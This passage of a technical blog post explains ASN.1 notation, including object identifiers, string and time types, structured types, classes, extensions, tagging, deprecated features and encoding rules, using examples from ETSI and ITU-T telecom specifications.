international\\nlevel.\\n\\nETSI for instance is managed by ITU-T\\n`itu-t(0) identified-organization(4) etsi(0)`\\n\\n<div>\\n    <img src=\\"/img/blog/the-specs-behind-the-specs/etsi_asn1oidtree.gif\\" alt=\\"ETSI OID tree\\" />\\n</div>\\n\\nand as can see in the `Modules` example version 8 of cap-datatypes is part of ETSI.\\n`CAP-datatypes {itu-t(0) identified-organization(4) etsi(0) mobileDomain(0) umts-network(1) modules(3) cap-datatypes(52) version8(7)}`\\n\\nOther root arcs\\n\\n| Root | Organization    |\\n| ---- | --------------- |\\n| 0    | ITU-T           |\\n| 1    | ISO             |\\n| 2    | joint-iso-itu-t |\\n\\nThe labels are optional and the reference could also be written as `{0\\n4 0 0 1 3 52 7}`. Only positive integers are allowed including zero (0).\\n\\nAnother example comes from the CAP-object-identifiers module in ETSI 129.078.\\n\\n```asn.1\\ntc-Messages OBJECT IDENTIFIER ::=\\n    {itu-t recommendation q 773 modules(2) messages(1) version3(3)}\\n\\nid-CAP OBJECT IDENTIFIER ::=\\n    {itu-t(0) identified-organization(4) etsi(0) mobileDomain(0)\\n     umts-network(1) cap4(22)}\\n\\nid-ac OBJECT IDENTIFIER ::= {id-CAP ac(3)}\\n```\\n\\n`id-ac` is a child of the `id-CAP` object identifier.\\n\\nOne could lookup object identifiers by visiting this amazing\\n[page (oidref.com)](https://oidref.com/).\\n\\n### EXTERNAL\\n\\n`EXTERNAL` represents a value that does not need to be specified as a\\nASN.1 type. It carries information on how the data should be interpreted.\\n\\n{% raw %}```asn.1\\nUnidirectional {OPERATION:Invokable, OPERATION:Returnable} ::= SEQUENCE {\\n  dialoguePortion  DialoguePortion OPTIONAL,\\n  components       ComponentPortion{{Invokable}, {Returnable}}\\n}\\n\\nDialoguePortion ::= [APPLICATION 11] EXPLICIT EXTERNAL\\n```{% endraw %}\\n\\nHere the value `dialoguePortion` will have tag 11 if specified, it is\\nthen up to the application to decide how to deal with the value.\\n\\n### REAL\\n\\nValues of the type `REAL` will take a triplet of numbers (m, b, e),\\nwhere m is the mantissa (a signed number), b the base (2 or 10), and e\\nthe exponent (a signed number).\\n\\nThere are also three special values it can take `PLUS-INFINITY`, 0,\\nand `MINUS-INFINITY`.\\n\\n```asn.1\\ntheBestRealValue REAL ::= (123, 10, -2) -- 1.23\\nmaxValue REAL ::= PLUS-INFINITY\\n```\\n\\n### String types\\n\\nI feel like most of the string types are the same, except that they\\nall take diffrent character sets. I\'ve already described `BIT STRING`\\nand `OCTET STRING` which both operate the bit set, but there is a\\nlot of others that operate over character sets.\\n\\n\\n\\n| Type                         | Tag | Character set regex/comment                                                                                                                                                                   |\\n| ---------------------------- | --- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\\n| UTF8String                   | 12  | Synonymous with UniversalString at abstract level                                                                                                                                             |\\n| NumericString                | 18  | `[0-9 ]`                                                                                                                                                                                      |\\n| PrintableString              | 19  | `[A-Za-z0-9\'()+,./:=? -]`                                                                                                                                                                     |\\n| TelexString (T61String)      | 20  | [ISOReg](https://www.itscj-ipsj.jp/custom_contents/cms/linkfile/ISO-IR.pdf) reg. #6, #87, #102, #103, #106, #107, #126, #144, #150, #153, #156, #164, #165, #168 + space,delete               |\\n| VideotexString               | 21  | [ISOReg](https://www.itscj-ipsj.jp/custom_contents/cms/linkfile/ISO-IR.pdf) reg. #1, #13, #72, #73, #87, #89, #102, #108, #126, #128, #129, #144, #150, #153, #164, #165, #168 + space,delete |\\n| IA5String                    | 22  | [ISOReg](https://www.itscj-ipsj.jp/custom_contents/cms/linkfile/ISO-IR.pdf) reg. #1, #6 + space,delete                                                                                        |\\n| GraphicString                | 25  | [ISOReg](https://www.itscj-ipsj.jp/custom_contents/cms/linkfile/ISO-IR.pdf) graphical sets (called \'G\') + space                                                                               |\\n| VisibleString (ISO646String) | 26  | [ISOReg](https://www.itscj-ipsj.jp/custom_contents/cms/linkfile/ISO-IR.pdf) reg. #6 + space                                                                                                   |\\n| GeneralString                | 27  | [ISOReg](https://www.itscj-ipsj.jp/custom_contents/cms/linkfile/ISO-IR.pdf) graphical sets (called \'G\'), control characters (called \'C\') + space,delete                                       |\\n| UniversalString              | 28  | [ISO10646-1]                                                                                                                                                                                  |\\n| BMPString                    | 30  | Basic Multilingual Plane; subtype of UniversalString                                                                                                                                          |\\n\\n\\n[ISOReg](https://www.itscj-ipsj.jp/custom_contents/cms/linkfile/ISO-IR.pdf)\\nis a pretty good source, it reference most of the registers but not\\nall of them as far as I can see.\\n\\n\\nI\'ll list some examples of string types found in our ASN.1 files:\\n\\n```asn.1\\nAMFNameUTF8String ::= UTF8String (SIZE(1..150, ...))\\n\\nDirectoryString ::= CHOICE {\\n    teletexString TeletexString (SIZE (1..maxSize)),\\n    printableString PrintableString (SIZE (1..maxSize)),\\n    universalString UniversalString (SIZE (1..maxSize)),\\n    bmpString BMPString (SIZE (1..maxSize))\\n--    utf8String UTF8String (SIZE (1..maxSize))\\n    }\\n\\nDisplayInformation ::= IA5String (SIZE (minDisplayInformationLength..maxDisplayInformationLength))\\n```\\n`IA5String` is used to represent ISO 646 (IA5; International Alphabet 5)\\ncharacters.  The entire character set contains precisely 128\\ncharacters and are generally equivalent to the first 128 characters of\\nthe ASCII alphabet.\\n\\nThere are multiple formats for the values of `UniversalString`, `BMPString` and\\n`UTF8String` types. One could either specify a quadruple with `{group,\\nplane, row, cell}` for the character needed, or an array of defined values (strings).\\n\\nAn example from Dubuisson:\\n\\n```asn.1\\nlatinCapitalLetterA UniversalString ::= {0,0,0,65}\\ngreekCapitalLetterSigma UniversalString ::= {0,0,3,145}\\n\\nmy-string UniversalString ::= {\\n    \\"This is a capital A: \\", latinCapitalLetterA,\\n    \\", and a capital alpha: \\", greekCapitalLetterAlpha,\\n    \\"; try and spot the difference!\\"}\\n```\\n\\nAnd X.680 gives us yet another example\\n\\n```asn.1\\nIMPORTS\\n  BasicLatin, greekCapitalLetterSigma\\n  FROM ASN1-CHARACTER-MODULE\\n    { joint-iso-itu-t asn1(1) specification(0) modules(0) iso10646(0) };\\n\\n MyAlphabet ::= UniversalString (FROM (BasicLatin | greekCapitalLetterSigma))\\n\\n mystring MyAlphabet ::= { \\"abc\\" , greekCapitalLetterSigma , \\"def\\" }\\n```\\n\\n### Time types\\n\\nThe `UTCTime` and `GeneralizedTime` types are actually specified as\\n`VisibleString`.\\n\\n`UTCTime` format is \\"YYMMDD\\" for date followed by \\"hhmm\\" or \\"hhmmss\\"\\nfor time, ending with either \\"z\\", \\"-hhmm\\" or \\"+hhmm\\" for time offset.\\n\\nSpecifying \\"2021-12-14 04:32 CET\\" in `UTCTime`\\n\\n```asn.1\\n\\"2112140332Z\\"\\n\\"2112140432+0100\\"\\n```\\n\\n`GeneralizedTime` gives a bit more flexibility with regards to the format.\\n\\nIt consists of a calendar date of format \\"YYYYMMDD\\", followed by\\neither \\"hh\\", \\"hhmm\\", \\"hhmmss\\" and optional parts \\".[0-9]+\\", and\\noptionally ending with the coordinated universal time character \\"z\\" or\\nthe time offset in hours/minutes \\"-hhmm\\" or \\"+hhmm\\".\\n\\nThese are the same, but one with higher precision and in local time.\\n```asn.1\\n\\"2021121403.54Z\\" -- 3.54 hours after midnight\\n\\"20211214043227.981935+0100\\" -- 3 hours, 32 minutes, 27 seconds, 981935 microseconds\\n```\\n\\n`DATE`, `TIME-OF-DAY`, `DATE-TIME` and `DURATION` was introduced after\\nthe third generation of ISO 8601 was released 2004.\\n\\nThey are defined as subsets of `TIME`.\\n\\n```asn.1\\nDATE ::= [UNIVERSAL 31] IMPLICIT TIME\\n       (SETTINGS \\"Basic=Date Date=YMD Year=Basic\\")\\nTIME-OF-DAY ::= [UNIVERSAL 32] IMPLICIT TIME\\n       (SETTINGS \\"Basic=Time Time=HMS Local-or-UTC=L\\")\\nDATE-TIME ::= [UNIVERSAL 33] IMPLICIT TIME\\n       (SETTINGS \\"Basic=Date-Time Date=YMD Year=Basic Time=HMS Local-or-UTC=L\\")\\nDURATION ::= [UNIVERSAL 34] IMPLICIT TIME\\n       (SETTINGS \\"Basic=Interval Interval-type=D\\")\\n```\\n\\nAs I can find no real world examples from our ASN.1-files, I\'m forced\\nto make-up examples of these\\n\\n```asn.1\\ndate1 DATE ::= \\"211214\\"\\ntime1 TIME-OF-DAY ::= \\"043227\\"\\ndate-time1 DATE-TIME ::= \\"211214043227\\"\\nduration1 DURATION ::= \\"P0Y29M0DT0H0M0S\\" -- 29 months to an accuracy of 1 second\\n```\\n\\nValues of type `DURATION` starts with \\"P\\" followed by alot of\\ndifferent optional parts and formats.  If the time designation is used\\nit should start with a \\"T\\" to keep months and minutes separate.\\n\\n```asn.1\\nduration2 DURATION ::= \\"P2MT2M\\" -- 2 months and 2 minutes\\nduration3 DURATION ::= \\"P29M0DT0.00M\\" -- 29 months with accuracy of one-hundredth of a minute\\nduration4 DURATION ::= \\"P32W\\" -- 32 weeks\\n```\\n\\n\\n## Structured types\\n\\n### CHOICE\\n\\nThe type `CHOICE` can take values from one of multiple types, `CHOICE`\\ndoesn\'t have it\'s own universal tag.\\n\\n```asn.1\\nCancelArg ::= CHOICE {\\n    invokeID        [0] InvokeID,\\n    allRequests     [1] NULL\\n}\\n```\\n\\nThe value of type `CancelArg` will either of an `InvokeID` type, or a\\n`NULL` type.  It will be tagged `[0]` or `[1]` respectively, that is\\nwhy `CHOICE` doesn\'t have it\'s own universal tag, as it is derived\\nfrom ASN.1 specification.\\n\\n### SEQUENCE (OF)\\n\\n`SEQUENCE` and `SEQUENCE OF` are used for composing multiple types.\\n\\n```asn.1\\nEventTypeSMS ::= ENUMERATED {\\n    sms-CollectedInfo                   (1),\\n    o-smsFailure                        (2),\\n    o-smsSubmission                     (3),\\n    sms-DeliveryRequested               (11),\\n    t-smsFailure                        (12),\\n    t-smsDelivery                       (13)\\n}\\nMonitorMode ::= ENUMERATED {\\n    interrupted                         (0),\\n    notifyAndContinue                   (1),\\n    transparent                         (2)\\n}\\n\\nSMSEvent ::= SEQUENCE {\\n    eventTypeSMS   [0] EventTypeSMS,\\n    monitorMode    [1] MonitorMode\\n}\\n\\nTone ::= SEQUENCE {\\n    toneID         [0] Integer4,\\n    duration       [1] Integer4 OPTIONAL,\\n    ...\\n}\\n```\\n\\nA value of the `SMSEvent` type have information on both `EventTypeSMS`\\nand `MonitorMode`. The fixed number of fields in the `SEQUENCE` type\\nare ordered.  Context-specific tagging (e.g. the `[0]`, `[1]`, `[2]`\\nstuff in the examples), is frequently applied for the structured\\ntypes, but one could also utilize the keywords `AUTOMATIC TAGGING` in\\nthe module definition.\\n\\n`SEQUENCE OF` on the other hand, holds an arbitrary number of fields\\nof a single type.\\n\\n```asn.1\\nFilterItem ::= CHOICE {\\n    equality         [0] AttributeValueAssertion,\\n    substrings       [1] SEQUENCE {\\n        type    ATTRIBUTE.&id({SupportedAttributes}),\\n        strings SEQUENCE OF CHOICE {\\n            initial [0] ATTRIBUTE.&Type({SupportedAttributes}{@substrings.type}),\\n            any     [1] ATTRIBUTE.&Type({SupportedAttributes}{@substrings.type}),\\n            final   [2] ATTRIBUTE.&Type({SupportedAttributes}{@substrings.type})\\n        }\\n    },\\n    greaterOrEqual   [2] AttributeValueAssertion,\\n    lessOrEqual      [3] AttributeValueAssertion,\\n    present          [4] AttributeType,\\n    approximateMatch [5] AttributeValueAssertion,\\n    extensibleMatch  [6] MatchingRuleAssertion\\n}\\n```\\n\\nIn the quite complex example above we see that the type `FilterItem`\\nis of type `CHOICE` and can take subtype called `strings`. `strings`\\nis of type `SEQUENCE OF CHOICE` which means it can take a list of\\nzero, one or more of `initial`, `any` or `final`. The example is quite\\ncomplex because it also uses multiple parameterized values. see\\n[Automatic, Implicit, Explicit tags](#automatic-implicit-explicit-tags)\\n\\nWe find another example in the DialoguePDUs module from\\n[Q.773](https://www.itu.int/rec/T-REC-Q.773-199706-I/en) where the\\nAARQ is of type `SEQUENCE`, and the third field `user-information` is\\nan `SEQUENCE OF` `EXTERNAL` type.\\n\\n```asn.1\\nAARQ-apdu ::= [APPLICATION 0] IMPLICIT SEQUENCE {\\n  protocol-version\\n    [0] IMPLICIT BIT STRING {version1(0)} DEFAULT {version1},\\n  application-context-name  [1]  OBJECT IDENTIFIER,\\n  user-information          [30] IMPLICIT SEQUENCE OF EXTERNAL OPTIONAL\\n}\\n```\\n\\nThey are quite different in how they are used, but they are encoded in\\na similar way. Some languages represent `SEQUENCE` internally as a\\n`struct`, and `SEQUENCE OF` as an array, but encoded they would look\\nquite similar.\\n\\n### SET (OF)\\n\\n`SET` and `SET OF` are similar to `SEQUENCE` and `SEQUENCE OF`\\nrespectively. The difference is that the composite types are\\nunordered.\\n\\nFrom `CAP-datatypes` we find an example of a `SET OF` with a\\n[parameterized component](#parameterized-components) specifying a size\\nconstraint.\\n\\n```asn.1\\nGenericNumbers {PARAMETERS-BOUND : bound} ::= SET SIZE(1..bound.&numOfGenericNumbers) OF GenericNumber {bound}\\n```\\n\\nOr an example of a value from the `TCAP-Tools` module in\\n[Q.775](https://www.itu.int/rec/T-REC-Q.775-199706-I/en)\\n\\n```asn.1\\ncancelFailed ERROR ::= {\\n  PARAMETER\\n    SET {problem   [0]  CancelProblem,\\n         invokeId  [1]  present < TCInvokeIdSet\\n    }\\n}\\n```\\n\\n### SELECTION\\n\\nThe SELECTION type `<` is used when one want\'s to obtain one of the\\npossible subtypes of a `CHOICE` definition.\\n\\nIf we expand the previous example from the [SET](#set-of)\\n\\n```asn.1\\ncancel OPERATION ::= {\\n  ARGUMENT  present < TCInvokeIdSet\\n  ERRORS    {cancelFailed}\\n}\\n\\ncancelFailed ERROR ::= {\\n  PARAMETER\\n    SET {problem   [0]  CancelProblem,\\n         invokeId  [1]  present < TCInvokeIdSet\\n    }\\n}\\n```\\n\\nwe see that the `ARGUMENT` type and the invokeId field take the type\\nfrom the `present` field in the `TCInvokeIdSet` type.\\n\\nthe definition of `TCInvokeIdSet` is as follows\\n\\n```asn.1\\nInvokeId ::= CHOICE {present  INTEGER,\\n                     absent   NULL\\n}\\n\\nTCInvokeIdSet ::= InvokeId(WITH COMPONENTS {\\n                             present  (-128..127)\\n                           })\\n```\\n\\nThus `invokeId` and `ARGUMENT` fields will take integer values which\\nare between -128 and 127.\\n\\n# Other concepts\\n\\n## DEFAULT and OPTIONAL keywords\\n\\nOne can use the `DEFAULT` keyword in order to specify the default value.\\n\\n```asn.1\\nCollectedDigits ::= SEQUENCE {\\n  minimumNbOfDigits    [0] INTEGER (1..16) DEFAULT 1,\\n  maximumNbOfDigits    [1] INTEGER (1..16),\\n  endOfReplyDigit      [2] OCTET STRING (SIZE (1..2)) OPTIONAL,\\n  cancelDigit          [3] OCTET STRING (SIZE (1..2)) OPTIONAL,\\n  startDigit           [4] OCTET STRING (SIZE (1..2)) OPTIONAL,\\n  firstDigitTimeOut    [5] INTEGER (1..127) OPTIONAL,\\n  interDigitTimeOut    [6] INTEGER (1..127) OPTIONAL,\\n  errorTreatment       [7] ErrorTreatment DEFAULT stdErrorAndInfo,\\n  interruptableAnnInd  [8] BOOLEAN DEFAULT TRUE,\\n  voiceInformation     [9] BOOLEAN DEFAULT FALSE,\\n  voiceBack            [10] BOOLEAN DEFAULT FALSE\\n}\\n```\\n\\nIn this example we see the type `CollectedDigits` where most of the\\nvalues are either `DEFAULT` or `OPTIONAL`. The only value that needs\\nto be set is `maximumNbOfDigits`.\\n\\n## Classes\\n\\nOne can also use informal object classes in order to specify and\\ndefine values for general types.\\n\\n```asn.1\\nOPERATION ::= CLASS {\\n  &ArgumentType          OPTIONAL,\\n  &argumentTypeOptional  BOOLEAN OPTIONAL,\\n  &returnResult          BOOLEAN DEFAULT TRUE,\\n  &ResultType            OPTIONAL,\\n  &resultTypeOptional    BOOLEAN OPTIONAL,\\n  &Errors                ERROR OPTIONAL,\\n  &Linked                OPERATION OPTIONAL,\\n  &synchronous           BOOLEAN DEFAULT FALSE,\\n  &alwaysReturns         BOOLEAN DEFAULT TRUE,\\n  &InvokePriority        Priority OPTIONAL,\\n  &ResultPriority        Priority OPTIONAL,\\n  &operationCode         Code UNIQUE OPTIONAL\\n}\\nWITH SYNTAX {\\n  [ARGUMENT &ArgumentType\\n   [OPTIONAL &argumentTypeOptional]]\\n  [RESULT &ResultType\\n   [OPTIONAL &resultTypeOptional]]\\n  [RETURN RESULT &returnResult]\\n  [ERRORS &Errors]\\n  [LINKED &Linked]\\n  [SYNCHRONOUS &synchronous]\\n  [ALWAYS RESPONDS &alwaysReturns]\\n  [INVOKE PRIORITY &InvokePriority]\\n  [RESULT-PRIORITY &ResultPriority]\\n  [CODE &operationCode]\\n}\\n\\nprovideRoutingInformation OPERATION ::= {\\n  ARGUMENT  RequestArgument\\n  RESULT    RoutingInformation\\n  ERRORS\\n    {invalidCalledNumber | subscriberNotReachable | calledBarred |\\n      processingFailure}\\n  LINKED    {getCallingPartyAddress}\\n}\\n\\ngetCallingPartyAddress OPERATION ::= {\\n  RESULT  CallingPartyAddress\\n  ERRORS  {callingPartyAddressNotAvailable | processingFailure}\\n}\\n\\ninvalidCalledNumber ERROR ::= {CODE  local:1}\\nsubscriberNotReachable ERROR ::= {CODE  local:2}\\n\\nRequestArgument ::= SEQUENCE {\\n  calledNumber  IsdnNumber,\\n  basicService  BasicServiceIndicator OPTIONAL\\n}\\n\\nRoutingInformation ::= CHOICE {\\n  reroutingNumber    [0] IMPLICIT IsdnNumber,\\n  forwardedToNumber  [1] IMPLICIT IsdnNumber\\n}\\n\\n```\\n\\nIn the above `OPERATION` class, a syntax is defined for the\\nclass. This class and syntax can then be used to define specific\\nvalues, for instance the `provideRoutingInformation` and\\n`getCallingPartyAddress` values.\\n\\nWe also glimse another class in the above example which I didn\'t\\ninclude. Can you find it?\\n\\n## Parameterized components\\n\\nAnother way to make the specs more generalized is to use parameterized\\ncomponents. We\'ve already seen a couple of examples of such, see the\\nchapter for the [NULL](#null), [EXTERNAL](#external) and [SET\\n(OF)](#set-of) types.\\n\\nLet\'s look at the example from `SET OF` again.\\n\\n```asn.1\\nGenericNumbers {PARAMETERS-BOUND : bound} ::= SET SIZE(1..bound.&numOfGenericNumbers) OF GenericNumber {bound}\\n\\nGenericNumber {PARAMETERS-BOUND : bound} ::= OCTET STRING (SIZE(\\n    bound.&minGenericNumberLength .. bound.&maxGenericNumberLength))\\n```\\n\\n`GenericNumbers` take a parameter `bound` of the type `PARAMETERS-BOUND` as input.\\n\\n`PARAMETERS-BOUND` is defined as a class with a lot of different\\ninteger values, so I\'ve minimized the class a bit.\\n\\n```asn.1\\nPARAMETERS-BOUND ::= CLASS {\\n    --- a lot of other fields\\n    &minGenericNumberLength  INTEGER,\\n    &maxGenericNumberLength  INTEGER,\\n    &numOfGenericNumbers     INTEGER,\\n}\\n\\nWITH SYNTAX {\\n    --- a lot of other fields\\n    MINIMUM-FOR-GENERIC-NUMBER  &minGenericNumberLength\\n    MAXIMUM-FOR-GENERIC-NUMBER  &maxGenericNumberLength\\n    NUM-OF-GENERIC-NUMBERS      &numOfGenericNumbers\\n}\\n```\\n\\nOne could then specify different values using the `PARAMETERS-BOUND`\\nclass to reuse the `GenericNumber` and `GenericNumbers` types.\\n\\n```asn.1\\ncAPSpecificBoundSet PARAMETERS-BOUND ::= {\\n    --- again, lots of other values\\n    MINIMUM-FOR-GENERIC-NUMBER                  3\\n    MAXIMUM-FOR-GENERIC-NUMBER                  11\\n    NUM-OF-GENERIC-NUMBERS                      5\\n}\\n```\\n\\nIf one would pass `cAPSpecificBoundSet` to a value of type\\n`GenericNumbers`, it would define an instance which holds 1-5\\n`GenericNumber`s of 3-11 octets.\\n\\nQuite powerful if you have multiple definitions which uses similar\\nstructure.\\n\\n## Extensions\\n\\nSometimes you will need to support different versions of a protocol\\n(or someone else need to support different version, and you just need\\nto read the types of the protocol), and maybe the new version need to\\nextend some types in order to include more information. Then without\\nredefining everything and copy the previous version of the type to the\\nnew version of the type one can use extension markers (syntax `...`).\\n\\nTake the `QosMonitoringRequest` type below as an example. In the first\\nversion of the protocol (NGAP if you really want to know), the\\n`QoSMonitoringRequest` could take only enums `ul`, `dl`, or `both`.\\nHowever, in a subsequent version it was extended with a new enum\\n`stop`. With the extension marker `...` the v1-compilers can handle\\nthe first three enums, and the v2-compilers can handle all enums from\\nv1 but also the `stop` enum.\\n\\n```asn.1\\nQosMonitoringRequest ::= ENUMERATED {\\n    ul,\\n    dl,\\n    both,\\n    ...\\n} -- version 1\\n\\nQosMonitoringRequest ::= ENUMERATED {\\n    ul,\\n    dl,\\n    both,\\n    ...,\\n    stop\\n} -- version 2\\n```\\n\\nFor enums, if there is yet a newer version, say version 3 of this type\\none, you should just add the new enum under the previous enums.\\n\\n```asn.1\\nQosMonitoringRequest ::= ENUMERATED {\\n    ul,\\n    dl,\\n    both,\\n    ...,\\n    stop,\\n    half\\n} -- imaginary version 3\\n```\\n\\nFor `SEQUENCE`, `SET` and `CHOICE` one could either do the same, or to\\nkeep the versions separated, add another extension mark with the new\\nfields in between. One could also add version brackets to group the\\nextensions and highlight the differences.\\n\\n```asn.1\\nAx ::= SEQUENCE {\\n    a INTEGER (250..253),\\n    b BOOLEAN,\\n    c CHOICE {\\n        d INTEGER, -- version 1\\n        ...,\\n        [[\\n            e BOOLEAN,\\n            f IA5String\\n        ]],\\n        ... -- version 2\\n    },\\n    ..., -- version 1\\n    [[\\n        g NumericString (SIZE(3)),\\n        h BOOLEAN OPTIONAL\\n    ]],\\n    ..., -- version 2\\n    i BMPString OPTIONAL,  -- version 3\\n    j PrintableString OPTIONAL -- version 3\\n}\\n\\n```\\n\\nOnly the types `ENUMERATED`, `SEQUENCE`, `SET` and `CHOICE`, as well\\nas subtype constraints, and object and value sets can be extended.\\n\\n## Automatic, Implicit, Explicit tags\\n\\nWhen an value is transmitted all ambiguities need to be removed. That\\nis why every type needs to have an unique identifier, called a tag.\\n\\nThe section [DEFAULT and OPTIONAL\\nkeywords](#default-and-optional-keywords) has a good example I will\\nexplain.\\n\\n\\n```asn.1\\nCollectedDigits ::= SEQUENCE {\\n  minimumNbOfDigits    [0] INTEGER (1..16) DEFAULT 1,\\n  maximumNbOfDigits    [1] INTEGER (1..16),\\n  endOfReplyDigit      [2] OCTET STRING (SIZE (1..2)) OPTIONAL,\\n  cancelDigit          [3] OCTET STRING (SIZE (1..2)) OPTIONAL,\\n  startDigit           [4] OCTET STRING (SIZE (1..2)) OPTIONAL,\\n  firstDigitTimeOut    [5] INTEGER (1..127) OPTIONAL,\\n  interDigitTimeOut    [6] INTEGER (1..127) OPTIONAL,\\n  errorTreatment       [7] ErrorTreatment DEFAULT stdErrorAndInfo,\\n  interruptableAnnInd  [8] BOOLEAN DEFAULT TRUE,\\n  voiceInformation     [9] BOOLEAN DEFAULT FALSE,\\n  voiceBack            [10] BOOLEAN DEFAULT FALSE\\n}\\n```\\n\\nIn this sequence we can see that many of the values are optional and\\nsome have defaults, only the value `maximumNbOfDigits` is mandatory.\\n\\nWhen the sending side transmits a value of `CollectedDigits` type, the\\nreceiving side will get a sequence of the values mentioned. With\\nBER-encoding each defined value will have an identifier, a length (of\\nthe value transmitted) and the value. This is called a\\nTag-Length-Value or TLV for short.\\n\\nAll basic types already has an universal tag as stated in the [types\\ntable](#types), but the composite types does not. (If not tagged, how\\nwould it see the difference between `endOfReplyDigit`, `cancelDigit`\\nand `startDigit` in the example above?)\\n\\n```asn.1\\nRoutingInformation ::= CHOICE {\\n  reroutingNumber    [0] IMPLICIT IsdnNumber,\\n  forwardedToNumber  [1] IMPLICIT IsdnNumber\\n}\\n\\nIsdnNumber ::= SEQUENCE {\\n  typeOfAddress  TypeOfAddress,\\n  digits         TelephonyString\\n}\\n\\nTypeOfAddress ::= ENUMERATED {national(0), international(1), private(2)}\\n\\nTelephonyString ::=\\n  IA5String\\n    (FROM (\\"0\\" | \\"1\\" | \\"2\\" | \\"3\\" | \\"4\\" | \\"5\\" | \\"6\\" | \\"7\\" | \\"8\\" | \\"9\\" | \\"*\\" |\\n           \\"#\\"))(SIZE (1..15))\\n\\n```\\n\\nA value of `RoutingInformation` in this example will with BER encoding\\nonly transmit the tag `[0]` or `[1]` (and of course the length and\\nvalue). It counts on that the receiving part has the same version of\\nthe ASN.1 and knows the abstract syntax. If it wouldn\'t have been\\n`IMPLICIT`, then it would have sent either tags `[0]` or `[1]`\\nfollowed by the tags for `TypeOfAddress` (ENUMERATED) `[10]`, and tags\\nfor `TelephonyString` (IA5String) `[4]`.\\n\\nOne can specify `IMPLICIT` and `EXPLICIT` tagging on module basis,\\nwhere the `DEFINITIONS` are assigned.\\n\\n```asn.1\\nDEFINITIONS IMPLICIT TAGS ::= BEGIN\\n```\\n\\nInstead of writing all the tags self (explicitly in both cases), one\\ncan instead use the keywords `AUTOMATED TAGS`.\\n\\n```asn.1\\nDEFINITIONS AUTOMATIC TAGS ::= BEGIN\\n```\\n\\nThis will add tags to the composit types that doesn\'t have them\\n(explicitly) set.\\n\\n## Deprecations and discouragements\\n\\nSome things have been deprecated from earlier ASN.1 specifications,\\nand use of these are strongly discouraged.\\n\\n### ANY\\n\\nFirst out is the `ANY` type, which could take the form of any\\nvalue. It\'s like an unrestricted `CHOICE` type.\\n\\n```asn.1\\nInvoke ::= SEQUENCE {\\n    invokeID           InvokeIdType,\\n    linkedID       [0] InvokeIdType OPTIONAL,\\n    operationCode      MAP-OPERATION,\\n    parameter          InvokeParameter OPTIONAL\\n}\\nInvokeParameter ::= ANY\\n```\\n\\nProblem with this is that the ASN.1 compiler does not have a formal\\nway of knowing which values are approved. The use of `ANY` also\\nusually meant it was coupled with some other value, for instance the\\n`operationCode` in the example above.\\n\\nTo make this link one could have used `DEFINED BY` specifying which\\nfield the `ANY` type is coupled with. The drawback with this solution\\nis that it still has an ambiguous meaning, and the types are of no use\\nfor the application designer.\\n\\n```asn.1\\nExtensionField ::= SEQUENCE {\\n    type        INTEGER,\\n    --  shall identify the value of an EXTENSION type\\n    criticality ENUMERATED {\\n        ignore(0),\\n        abort(1)\\n    } DEFAULT ignore,\\n    value   [1] ANY DEFINED BY type\\n}\\n```\\n\\nInstead the concept of informal object classes and parameterized\\ncomponents were introduced.\\n\\n### Macros\\n\\nMacros were removed because they were poorly documented and too\\ngeneral. Because of this they were hard to implement and automate in\\nthe compilers. They follow the BNF notation.\\n\\n```asn.1\\nOPERATION MACRO ::=\\nBEGIN\\n    TYPE NOTATION ::= Parameter Result Errors LinkedOperations\\n    VALUE NOTATION ::= value (VALUE CHOICE { localValue INTEGER, globalValue OBJECT IDENTIFIER } )\\n    Parameter ::= ArgKeyword NamedType | empty\\n    ArgKeyword ::= \\"ARGUMENT\\" | \\"PARAMETER\\"\\n    Result ::= \\"RESULT\\" ResultType | empty\\n    Errors ::= \\"ERRORS\\" \\"{\\"ErrorNames\\"}\\" | empty\\n    LinkedOperations ::= \\"LINKED\\" \\"{\\"LinkedOperationNames\\"}\\" | empty\\n    ResultType ::= NamedType | empty\\n    ErrorNames ::= ErrorList | empty\\n    ErrorList ::= Error | ErrorList \\",\\" Error\\n    Error ::= value (ERROR)\\n             -- shall reference an error value\\n             | type\\n             -- shall reference an error type\\n             -- if no error value is specified\\n    LinkedOperationNames ::= OperationList | empty\\n    OperationList ::= Operation | OperationList \\",\\" Operation\\n    Operation ::= value (OPERATION)\\n                  -- shall reference an operation value\\n                  | type\\n                  -- shall reference an operation type if\\n                  -- no operation value is specified\\n    NamedType ::= identifier type | type\\nEND\\n```\\n\\nThe two needed fields of the macro are `TYPE NOTATION` and `VALUE\\nNOTATION`. The rest of the fields are the value sequence defining what\\nthe macro should insert. Quotes define the string to insert (excluding\\nthe actual quotes), `empty` inserts nothing. `identifier`, `value`, or\\n`type` are used to infer different things. Dubuisson has (yet again) a\\ngood chapter on this topic.\\n\\nAlso here one should use informal object classes and parameterized\\ncomponents instead of using macros.\\n\\n# Encodings\\n\\nThere are numerous codecs when transmitting the abstract syntax, all\\nwith different pros and cons.\\n\\n| Short name | Long name                    |\\n| ---------- | ---------------------------- |\\n| BER        | Basic encoding rules         |\\n| DER        | Distinguished encoding rules |\\n| CER        | Canonical encoding rules     |\\n| PER        | Packed encoding rules        |\\n| OER        | Octet encoding rules         |\\n| XER        | XML encoding rules           |\\n| EXER       | Extended XML encoding rules  |\\n| JER        | JSON encoding rules          |\\n\\n\\nBER is the oldest encoding rule for ASN.1. It uses Tag-Length-Value\\nformat where all tags, lengths and values are multiples of\\noctets. Because this was the first encoding rule it was named `basic`\\nto indicate that there might be more standardized encoding rules in\\nthe future.\\n\\nDER and CER are subsets of BER, which was added for developers of\\nX.400 email and X.500 directory applications. It provides means to\\nmake sure bit strings are not altered during transfer. The main\\ndifference between DER and CER is that DER uses a definite-length\\nformat and CER an indefinite-length format, so CER is best used for\\napplications that transfer a big amount of data.\\n\\nPER is the most compact format, and used for bandwith conservation. It\\ndoes not send the Tag of the TLV because the order in which components\\nof the message occur is known.  PER also does not send the Length of\\nthe TLV if the Value has a fixed length. It uses information from\\nASN.1 message description to eliminate redundant information from the\\nValue portion. It can either be aligned to multiple of octets by\\npadding each value with \'0\'s, or unaligned (U-PER/Unaligned PER) which\\nis more compact but take more time to decode.\\n\\nOER was adapted from PER and uses an octet oriented format, so the\\nlength of all specified Tags, Lengths, and Values are padded to be\\nmultiples of 8 bits octets as in BER. OER is usually faster than both\\nBER and PER with regards to encoding and decoding.\\n\\nXER, CXER and EXER are used for transmitting XML format. CXER is used\\nfor transmitting data canonically, e.g. used by security applications.\\nEXER or Extended XER is used when \\"stylish\\" features is wanted, and\\nadds possibility to extend the encoder for instance when wanting to\\ninsert processing instructions or comments into the XML.\\n\\nJER is used when transmitting JSON in accordance to the 